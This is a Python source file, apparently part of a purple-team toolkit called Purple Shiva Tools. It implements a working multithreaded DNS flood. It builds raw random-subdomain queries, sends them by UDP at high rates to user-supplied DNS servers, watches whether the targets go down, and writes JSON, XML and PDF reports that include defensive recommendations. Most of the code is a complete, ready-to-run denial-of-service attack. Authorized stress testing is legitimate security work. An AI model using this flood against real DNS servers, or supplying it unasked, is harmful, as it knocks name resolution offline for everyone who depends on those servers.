#!/usr/bin/env python3
# DNS Flood Attack + Reporting

import argparse
import socket
import random
import struct
import threading
import time
import os
import signal
import sys
import json
import xml.etree.ElementTree as ET
from datetime import datetime
import shutil
from reportlab.lib.pagesizes import letter
from reportlab.lib import colors
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.pdfgen import canvas as pdfcanvas
from reportlab.platypus import (
    BaseDocTemplate, PageTemplate, Frame,
    Paragraph, Spacer, Table, KeepTogether
)
from reportlab.lib.utils import ImageReader
from reportlab.graphics.shapes import Line, Drawing
from reportlab.lib.colors import HexColor

# Terminal colors
RED = "\033[38;2;255;0;0m"
GREEN = "\033[38;2;0;255;0m"
RESET = "\033[0m"
BOLD = "\033[1m"

RECOMMENDATIONS = [
    {
        "id": 1,
        "title": "Implement Rate Limiting on DNS Servers",
        "severity": "High",
        "description": "DNS flood attacks overwhelm servers by sending a massive number of DNS queries. Rate limiting can control the number of queries from a single IP, reducing attack effectiveness.",
        "specificDetails": {
            "recommendation": "Configure DNS server software (e.g., BIND, Unbound, PowerDNS) to limit requests per second per IP using features like Response Rate Limiting (RRL)."
        },
        "sources": [
            "ISC BIND Documentation on Response Rate Limiting (RRL)",
            "Cloudflare: How Rate Limiting Protects DNS Infrastructure"
        ]
    },
    {
        "id": 2,
        "title": "Deploy Anycast DNS Architecture",
        "severity": "Medium",
        "description": "Anycast allows DNS queries to be distributed to the nearest server in a global network, improving resilience and balancing traffic loads during an attack.",
        "specificDetails": {
            "recommendation": "Use Anycast routing with geographically distributed DNS servers to improve load distribution and resistance to DDoS attacks."
        },
        "sources": [
            "RIPE NCC Article on Anycast DNS",
            "Cloudflare: Benefits of Anycast Networks for DNS"
        ]
    },
    {
        "id": 3,
        "title": "Use DNS Firewalls and DDoS Protection Services",
        "severity": "High",
        "description": "DNS firewalls can identify and block malicious DNS traffic patterns. DDoS mitigation providers offer scalable protection against volumetric attacks.",
        "specificDetails": {
            "recommendation": "Integrate DNS firewall solutions and subscribe to DDoS protection services such as Cloudflare, Akamai, or AWS Shield."
        },
        "sources": [
            "Akamai: DNS Firewall Best Practices",
            "AWS Shield Documentation for DDoS Protection"
        ]
    },
    {
        "id": 4,
        "title": "Enable Logging and Anomaly Detection",
        "severity": "Medium",
        "description": "Monitoring DNS logs helps detect unusual spikes in query rates, which may indicate an ongoing flood attack.",
        "specificDetails": {
            "recommendation": "Use tools like ELK Stack, Splunk, or Grafana with DNS log integration to monitor traffic and trigger alerts on anomalies."
        },
        "sources": [
            "Elastic Stack Guide: Analyzing DNS Logs for Security",
            "SANS Institute: DNS Monitoring for Incident Detection"
        ]
    },
    {
        "id": 5,
        "title": "Harden DNS Server Configurations",
        "severity": "Medium",
        "description": "Securing DNS servers reduces the surface area vulnerable to attack, such as disabling recursion for external clients and limiting access.",
        "specificDetails": {
            "recommendation": "Disable open recursion, limit zone transfers, restrict access by IP, and keep DNS server software up-to-date."
        },
        "sources": [
            "Internet Society: DNS Security Best Practices",
            "BIND Admin Guide: Secure DNS Server Configuration"
        ]
    }
]


logDir = "/var/log/purpleshivatoolslog"

if os.geteuid() != 0:
    print(f"{RED}Error: This script must be run as root.{RESET}")
    sys.exit(1)

# Global variables
dnsServers = []
attackDuration = 0
queryRate = 0
dnsThreads = 10
dnsRunning = False
startTime = None
packetsSent = 0
failures = []
stopTimer = False
stdoutLock = threading.Lock()
timerThread = None
dnsServerStatus = {}
dnsServerDownSince = {}


def UpdateTimer(startTime):
    global stopTimer, packetsSent
    previousStatus = {}

    while not stopTimer:
        elapsed = time.time() - startTime
        elapsedFormatted = time.strftime("%H:%M:%S", time.gmtime(elapsed))

        if not dnsServerStatus:
            statusStr = f"{BOLD}Waiting for DNS data...{RESET}"
        else:
            statusParts = []
            for server, status in dnsServerStatus.items():
                prev = previousStatus.get(server)

                # Visual cue if changed (e.g., BLINK or different color)
                if prev is not None and prev != status:
                    cueColor = "\033[5m"  # ANSI Blink
                else:
                    cueColor = ""

                color = GREEN if status else RED
                stateText = "UP" if status else "DOWN"

                part = f"{server}: {cueColor}{BOLD}{color}{stateText}{RESET}"
                statusParts.append(part)

                previousStatus[server] = status  # Update for next check

            statusStr = " | ".join(statusParts)

        output = (
            f"Packets Sent: {BOLD}{packetsSent}{RESET} | Duration: {BOLD}{elapsedFormatted}{RESET} | DNS Status: {statusStr}"
        )

        with stdoutLock:
            sys.stdout.write("\r" + " " * shutil.get_terminal_size().columns)
            sys.stdout.write("\r" + output)
            sys.stdout.flush()

        time.sleep(1)

    with stdoutLock:
        sys.stdout.write("\n")
        sys.stdout.flush()


def MonitorDnsStatus(startTime):
    checkInterval = 5
    while dnsRunning:
        for server in dnsServers:
            alive = IsDnsServerResponsive(server, timeout=1)
            prevStatus = dnsServerStatus.get(server, True)
            dnsServerStatus[server] = alive

            if prevStatus and not alive:
                dnsServerDownSince[server] = time.time() - startTime
            elif alive and server in dnsServerDownSince:
                del dnsServerDownSince[server]
        time.sleep(checkInterval)

def GenerateRandomDomain():
    letters = "abcdefghijklmnopqrstuvwxyz"
    domain = "".join(random.choice(letters) for _ in range(random.randint(5, 10)))
    return domain + ".com"

def CreateDnsQuery(domain):
    transactionId = random.randint(0, 65535)
    flags = struct.pack(">H", 0x0100)
    numQueries = struct.pack(">H", 1)
    encodedDomain = b""
    for label in domain.split("."):
        encodedDomain += struct.pack(">B", len(label)) + label.encode()
    encodedDomain += b"\x00"
    return (
        struct.pack(">H", transactionId)
        + flags
        + numQueries
        + b"\x00\x00\x00\x00\x00\x00"
        + encodedDomain
        + struct.pack(">H", 1)
        + struct.pack(">H", 1)
    )

def SendDnsQueries():
    global dnsRunning, packetsSent, failures
    endTime = time.time() + attackDuration
    while dnsRunning and time.time() < endTime:
        try:
            targetIp = random.choice(dnsServers)
            domain = GenerateRandomDomain()
            query = CreateDnsQuery(domain)
            sockType = socket.AF_INET6 if ":" in targetIp else socket.AF_INET
            sock = socket.socket(sockType, socket.SOCK_DGRAM)
            sock.sendto(query, (targetIp, 53))
            sock.close()
            packetsSent += 1
            time.sleep(1 / queryRate)
        except Exception as e:
            failures.append(str(e))
            time.sleep(0.001)

def DnsFlood():
    threads = []
    for _ in range(dnsThreads):
        t = threading.Thread(target=SendDnsQueries)
        t.daemon = True
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

def IsDnsServerResponsive(targetIp, timeout=2):
    transactionId = random.randint(0, 65535)
    flags = 0x0100  # standard query
    qdcount = 1
    ancount = nscount = arcount = 0

    header = struct.pack(">HHHHHH", transactionId, flags, qdcount, ancount, nscount, arcount)

    domain_parts = "google.com".split(".")
    query = b""
    for part in domain_parts:
        query += struct.pack("B", len(part)) + part.encode()
    query += b"\x00"

    qtype = 1  # Type A
    qclass = 1  # Class IN
    query += struct.pack(">HH", qtype, qclass)

    message = header + query

    try:
        # Choose socket type based on IP version
        if ":" in targetIp:  # IPv6
            sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
        else:  # IPv4
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        sock.settimeout(timeout)
        sock.sendto(message, (targetIp, 53))
        data, _ = sock.recvfrom(512)
        sock.close()

        resp_id = struct.unpack(">H", data[:2])[0]
        return resp_id == transactionId
    except Exception:
        return False


def MonitorDnsServers():
    while dnsRunning:
        for server in dnsServers:
            alive = IsDnsServerResponsive(server)
            status = "UP" if alive else "DOWN"
            with stdoutLock:
                print(f"\n[Monitor] DNS Server {server} status: {status}")
        time.sleep(10)  # check every 10 seconds

def Start():
    global dnsRunning, startTime, stopTimer, timerThread, packetsSent

    dnsRunning = True
    packetsSent = 0
    startTime = time.time()
    stopTimer = False

    timerThread = threading.Thread(target=UpdateTimer, args=(startTime,))
    timerThread.start()

    monitorThread = threading.Thread(target=MonitorDnsStatus, args=(startTime,), daemon=True)
    monitorThread.start()

    try:
        DnsFlood()
    finally:
        dnsRunning = False
        stopTimer = True
        timerThread.join()
        formatChoice = input(
            f"\nSave report as {BOLD}[XML]{RESET}, {BOLD}[JSON]{RESET}, "
            f"{BOLD}[PDF]{RESET} or {BOLD}[ALL]{RESET} (leave blank for none): "
        ).strip().lower()

        if formatChoice in ('xml', 'json', 'pdf', 'all'):
            WriteLogs(logDir, formatChoice, dnsServers, packetsSent, attackDuration)
        else:
            print(f"{RED}No log saved.{RESET}")

def WriteJsonLog(filePath, dnsServers, packetsSent, duration):
    global dnsServerDownSince

    downtimeReport = []
    for server in dnsServers:
        downSince = dnsServerDownSince.get(server)
        downtimeReport.append({
        "server": server,
        "downSince": round(downSince, 2) if downSince is not None else "Server never went down"
    })

    data = {
        "metadata": {
            "timestamp": datetime.now().isoformat(),
            "tool": "Purple Shiva Tools - DNS Flood Attack",
        },
        "dnsServers": dnsServers,
        "durationSeconds": round(duration, 2),
        "dnsPacketsSent": packetsSent,
        "dnsPacketsPerSecond": round(packetsSent / duration, 2) if duration > 0 else 0,
        "dnsServerStatus": downtimeReport,
        "securityRecommendations": [
            {
                "id": rec["id"],
                "title": rec["title"],
                "severity": rec["severity"],
                "description": rec["description"],
                "remediation": rec.get("specificDetails", {}),
                "sources": rec["sources"]
            } for rec in RECOMMENDATIONS
        ]
    }

    with open(filePath, 'w') as f:
        json.dump(data, f, indent=4, sort_keys=True)
    print(f"\n{BOLD}JSON log written to:{RESET} {filePath}")

def WriteXmlLog(filePath, dnsServers, packetsSent, duration):
    global dnsServerDownSince

    root = ET.Element("DnsFloodLog")

    # Metadata
    metadata = ET.SubElement(root, "metadata")
    ET.SubElement(metadata, "timestamp").text = datetime.now().isoformat()
    ET.SubElement(metadata, "tool").text = "Purple Shiva Tools - DNS Flood Attack"

    # DNS Servers
    servers = ET.SubElement(root, "dnsServers")
    for server in dnsServers:
        ET.SubElement(servers, "server").text = str(server)

    # Stats
    ET.SubElement(root, "durationSeconds").text = str(round(duration, 2))
    ET.SubElement(root, "dnsPacketsSent").text = str(packetsSent)
    ET.SubElement(root, "dnsPacketsPerSecond").text = str(
        round(packetsSent / duration, 2) if duration > 0 else 0
    )

    # DNS Server Status
    status = ET.SubElement(root, "dnsServerStatus")
    for server in dnsServers:
        entry = ET.SubElement(status, "entry")
        ET.SubElement(entry, "server").text = str(server)
        downSince = dnsServerDownSince.get(server)
        if downSince is not None:
            ET.SubElement(entry, "downSince").text = str(round(downSince, 2))
        else:
            ET.SubElement(entry, "downSince").text = "Server never went down"

    # Security Recommendations
    recs = ET.SubElement(root, "securityRecommendations")
    for rec in RECOMMENDATIONS:
        recEl = ET.SubElement(recs, "recommendation")
        ET.SubElement(recEl, "id").text = str(rec["id"])
        ET.SubElement(recEl, "title").text = str(rec["title"])
        ET.SubElement(recEl, "severity").text = str(rec["severity"])
        ET.SubElement(recEl, "description").text = str(rec["description"])

        remediation = ET.SubElement(recEl, "remediation")
        for key, value in rec.get("specificDetails", {}).items():
            ET.SubElement(remediation, key).text = str(value) if value is not None else ""

        sources = ET.SubElement(recEl, "sources")
        for ref in rec.get("sources", []):
            ET.SubElement(sources, "source").text = str(ref)

    # Compact XML
    compact_xml = ET.tostring(root, encoding='unicode', method='xml')

    with open(filePath, 'w') as f:
        f.write(compact_xml)

    print(f"\n{BOLD}XML log written to:{RESET} {filePath}")

def AddPageInfo(canvas, doc):
    """Adds banner and page number to each page"""
    scriptDir = os.path.dirname(os.path.abspath(__file__))
    mainDir = os.path.abspath(os.path.join(scriptDir, '../../../..'))
    bannerPath = os.path.join(mainDir, 'docs', 'reportbanner.png')

    pageWidth, pageHeight = letter
    banner = ImageReader(bannerPath)
    bannerHeight = (pageWidth * 80) / 500
    canvas.drawImage(banner, 0, pageHeight - bannerHeight, width=pageWidth, height=bannerHeight)

    canvas.setFont("Helvetica", 9)
    canvas.drawRightString(pageWidth - 40, 20, f"Page {canvas.getPageNumber()}")

def CreatePurpleLine(width=550, thickness=0.5):
    """Creates the signature purple divider line"""
    usableWidth = letter[0] - 36 - 36
    startX = (usableWidth - width) / 2
    line = Line(startX, 0, startX + width, 0)
    line.strokeColor = colors.HexColor('#461f6b')
    line.strokeWidth = thickness
    drawing = Drawing(usableWidth, thickness)
    drawing.add(line)
    return drawing

def WritePdfLog(filePath, dnsServers, packetsSent, duration):
    global dnsServerDownSince, RECOMMENDATIONS

    # — Build downtimeReport —
    downtimeReport = []
    for srv in dnsServers:
        down = dnsServerDownSince.get(srv)
        downtimeReport.append({
            "server": srv,
            "downSince": round(down, 2) if down is not None else "Server never went down"
        })

    # — Styles —
    styles       = getSampleStyleSheet()
    titleStyle   = ParagraphStyle('TitleStyle', parent=styles['Title'],
                                  fontSize=16, textColor=colors.HexColor('#461f6b'), alignment=1)
    headingStyle = ParagraphStyle('Heading2Style', parent=styles['Heading2'],
                                  fontSize=12, textColor=colors.HexColor('#461f6b'), alignment=1)
    bodyStyle    = ParagraphStyle('BodyStyle', parent=styles['BodyText'],
                                  fontSize=10, leading=14)
    introStyle   = ParagraphStyle('IntroStyle', parent=styles['BodyText'],
                                  fontSize=12, leading=16, textColor=HexColor("#2E4053"), alignment=1)

    # — Document setup —
    pageW, pageH = letter
    bannerH      = (pageW * 80) / 500
    margins      = dict(left=36, right=36, top=36 + bannerH, bottom=36)
    frame = Frame(margins['left'], margins['bottom'],
                  pageW - margins['left'] - margins['right'],
                  pageH - margins['top'] - margins['bottom'])
    doc = BaseDocTemplate(
        filePath, pagesize=letter,
        leftMargin=margins['left'], rightMargin=margins['right'],
        topMargin=margins['top'], bottomMargin=margins['bottom'],
        pageTemplates=[PageTemplate(id='DNSFlood', frames=[frame], onPage=AddPageInfo)]
    )

    elements = []

    # — Title & Intro —
    elements.append(KeepTogether([
        Paragraph("DNS Flood Attack Report", titleStyle),
        Spacer(1, 12),
        Paragraph(
            "This report was generated by the Purple Shiva Tools DNS Flood module.<br/>"
            "It details the DNS Flood attack against the target system, including parameters,<br/>"
            "observed behavior, and recommendations.<br/><br/>"
            'More at <font color="#461f6b"><b><u>'
            '<link href="https://github.com/PurpleShivaTeam/purpleshivatools">'
            "https://github.com/PurpleShivaTeam/purpleshivatools"
            '</link></u></b></font>',
            introStyle
        ),
        Spacer(1, 12),
        CreatePurpleLine(),    # now *after* intro
        Spacer(1, 20),
    ]))

    # — Attack Summary —
    hrs, rem   = divmod(int(duration), 3600)
    mins, secs = divmod(rem, 60)
    durStr     = f"{hrs:d}:{mins:02d}:{secs:02d}"

    summary = [
    ["Timestamp:", datetime.now().strftime("%Y-%m-%d %H:%M:%S")],
    ["Duration:", durStr],
    ["DNS Servers:", dnsServers[0] if dnsServers else "None"]
]

    # Add each additional DNS server on a new line without a label
    for server in dnsServers[1:]:
        summary.append(["", server])

    summary.extend([
        ["Packets Sent:", str(packetsSent)],
        ["Rate (pps):", f"{(packetsSent/duration):.2f}" if duration > 0 else "0.00"],
    ])

    elements.append(KeepTogether([
        Paragraph("Attack Summary", headingStyle),
        Spacer(1, 8),
        Table(summary, colWidths=[120, 300]),
        Spacer(1, 12),
        CreatePurpleLine(),
        Spacer(1, 12),
    ]))

    # — Downtime Report —
    dt_data = [["Server", "Down Since (sec)"]]
    for entry in downtimeReport:
        dt_data.append([entry["server"], str(entry["downSince"])])
    elements.append(KeepTogether([
        Paragraph("DNS Server Downtime", headingStyle),
        Spacer(1, 8),
        Table(dt_data, colWidths=[200, 120], repeatRows=1),
        Spacer(1, 12),
        CreatePurpleLine(),
        Spacer(1, 12),
    ]))

    # — Security Recommendations (all in one KeepTogether) —
    rec_block = [
        CreatePurpleLine(),
        Paragraph("Security Recommendations", headingStyle),
        Spacer(1, 8),
        Spacer(1, 12),
    ]
    for rec in RECOMMENDATIONS:
        rec_block.extend([
            Paragraph(f"<b>Recommendation {rec['id']}: {rec['title']}</b> (Severity: {rec['severity']})", bodyStyle),
            Spacer(1, 4),
            Paragraph(rec['description'], bodyStyle),
            Spacer(1, 4),
        ])
        for k, v in rec.get("specificDetails", {}).items():
            rec_block.extend([
                Paragraph(f"<b>{k}:</b> {v}", bodyStyle),
                Spacer(1, 2),
            ])
        rec_block.append(Paragraph("<b>References:</b>", bodyStyle))
        for i, src in enumerate(rec.get("sources", []), 1):
            rec_block.extend([
                Paragraph(f"{i}. {src}", bodyStyle),
                Spacer(1, 2),
            ])
        # extra space between recommendations
        rec_block.append(Spacer(1, 12))

    elements.append(KeepTogether(rec_block))

    # — Build PDF —
    doc.build(elements)
    print(f"\n{BOLD}PDF Report written to:{RESET} {filePath}")


def SignalHandler(sig, frame):
    global dnsRunning, stopTimer
    print(f"\n{RED}Interrupt received. Stopping the attack...{RESET}")
    dnsRunning = False
    stopTimer = True
    sys.exit(0)


def WriteLogs(logDir, fmt, dnsServers, packetsSent, duration):
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    if fmt == 'json':
        path = os.path.join(logDir, f"dnsflood_{timestamp}.json")
        WriteJsonLog(path, dnsServers, packetsSent, duration)
    elif fmt == "xml":
        path = os.path.join(logDir, f"dnsflood_{timestamp}.xml")
        WriteXmlLog(path, dnsServers, packetsSent, duration)
    elif fmt == "pdf":
        path = os.path.join(logDir, f"dnsflood_{timestamp}.pdf")
        WritePdfLog(path, dnsServers, packetsSent, duration)
    elif fmt == "all":
        path = os.path.join(logDir, f"dnsflood_{timestamp}.json")
        WriteJsonLog(path, dnsServers, packetsSent, duration)
        path = os.path.join(logDir, f"dnsflood_{timestamp}.xml")
        WriteXmlLog(path, dnsServers, packetsSent, duration)
        path = os.path.join(logDir, f"dnsflood_{timestamp}.pdf")
        WritePdfLog(path, dnsServers, packetsSent, duration)


def terminal():
    global dnsServers, attackDuration, queryRate
    parser = argparse.ArgumentParser(description="DNS Flood Attack Tool")
    parser.add_argument("-d", "--dns", required=True, help="Comma-separated DNS server IPs.")
    parser.add_argument("-t", "--duration", type=int, default=120, help="Duration in seconds.")
    parser.add_argument("-q", "--query_rate", type=int, default=1000, help="Queries per second per thread.")
    args = parser.parse_args()
    dnsServers = args.dns.split(",")
    attackDuration = args.duration
    queryRate = args.query_rate
    Start()

def menu():
    global dnsServers, attackDuration, queryRate
    dnsServers = input(f"\n{RED}DNS Server's IP addresses (e.g. '192.168.0.53,fd12:3456:789a::53'): {RESET}").split(",")
    attackDuration = int(input(f"{RED}Attack duration (s): {RESET}"))
    queryRate = int(input(f"{RED}DNS Packets rate (it will be multiplied by x10): {RESET}"))
    print("\n")
    Start()

def main():
    signal.signal(signal.SIGINT, SignalHandler)
    if len(sys.argv) > 1:
        terminal()
    else:
        menu()

if __name__ == "__main__":
    main()
